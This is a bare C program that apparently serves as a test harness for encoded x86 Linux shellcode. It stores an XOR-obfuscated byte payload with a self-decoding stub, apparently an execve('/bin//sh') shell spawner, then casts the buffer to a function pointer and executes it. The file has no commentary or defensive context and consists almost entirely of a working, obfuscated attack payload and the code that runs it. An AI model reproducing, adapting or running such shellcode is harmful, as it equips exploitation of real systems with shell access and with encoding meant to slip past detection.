
#include<stdio.h>
#include<string.h>


int main()

{
	unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";
  

	
	printf("Shellcode Length: %d\n",strlen(code));
	
        int (*ret)() = (int(*)())code;
	
 	ret();
	
	//(*(void(*)())code)();
		
}	


